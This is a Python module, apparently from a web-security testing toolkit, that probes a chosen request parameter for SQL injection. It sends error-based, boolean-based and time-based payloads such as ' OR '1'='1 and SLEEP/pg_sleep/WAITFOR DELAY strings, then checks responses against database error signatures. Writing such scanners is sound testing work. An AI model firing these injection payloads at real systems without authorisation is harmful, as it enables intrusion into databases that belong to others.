"""sqli — reflected SQL-injection probe (error, boolean, time based).

Reuses the detection logic from the standalone sqli_test.py but adapted to the
toolkit's HttpClient. Requires opts['param']; opts may set opts['method'].
"""
import re
from common import Finding

NAME = "sqli"

ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL", r"Warning.*mysqli?", r"MySqlException",
    r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::SyntaxError",
    r"unterminated quoted string", r"SQLiteException", r"sqlite3.OperationalError",
    r"Microsoft SQL (Server|Native Client)", r"ODBC SQL Server Driver",
    r"Unclosed quotation mark after the character string",
    r"ORA-\d{5}", r"quoted string not properly terminated", r"DB2 SQL error",
]
ERROR_RE = re.compile("|".join(ERROR_SIGNATURES), re.IGNORECASE)

ERROR_PAYLOADS = ["'", '"', "')", "';", "' OR '1"]
BOOL_PAIRS = [("' OR '1'='1", "' OR '1'='2"), (" OR 1=1-- -", " OR 1=2-- -")]


def _sim(a, b):
    if not a and not b:
        return 1.0
    m = max(len(a), len(b))
    return (min(len(a), len(b)) / m) if m else 1.0


def _send(client, method, param, base, payload):
    val = base + payload
    if method == "GET":
        return client.request("GET", params={param: val})
    return client.request("POST", data={param: val})


def run(client, opts):
    param = opts.get("param")
    if not param:
        return [Finding(NAME, "info", "SQLi check skipped",
                        "no --param provided; specify a parameter to inject")]
    method = opts.get("method", "GET").upper()
    base = str(opts.get("base_value", "1"))
    sleep_s = int(opts.get("sleep", 5))
    out = []

    baseline = _send(client, method, param, base, "")

    # error-based
    for p in ERROR_PAYLOADS:
        r = _send(client, method, param, base, p)
        m = ERROR_RE.search(r.body)
        if m:
            fnd = Finding(NAME, "critical", "Error-based SQL injection",
                          f"payload {p!r} surfaced a DB error", m.group(0))
            fnd.payload = base + p
            out.append(fnd)
            break

    # boolean-based blind
    for true_p, false_p in BOOL_PAIRS:
        t = _send(client, method, param, base, true_p)
        f = _send(client, method, param, base, false_p)
        if _sim(t.body, baseline.body) > 0.95 and _sim(t.body, f.body) < 0.90:
            fnd = Finding(NAME, "critical", "Boolean-based blind SQL injection",
                          f"{true_p!r} matches baseline, {false_p!r} diverges",
                          f"T/F sim={_sim(t.body, f.body):.2f}")
            fnd.payload = base + true_p
            out.append(fnd)
            break

    # time-based blind
    for p in [f"' OR SLEEP({sleep_s})-- -", f"'; SELECT pg_sleep({sleep_s})-- -",
              f"'; WAITFOR DELAY '0:0:{sleep_s}'-- -"]:
        r = _send(client, method, param, base, p)
        if r.elapsed >= sleep_s * 0.8 and r.elapsed > baseline.elapsed + sleep_s * 0.6:
            fnd = Finding(NAME, "critical", "Time-based blind SQL injection",
                          f"payload delayed response to {r.elapsed:.1f}s "
                          f"(baseline {baseline.elapsed:.1f}s)", p)
            fnd.payload = base + p
            out.append(fnd)
            break
    return out
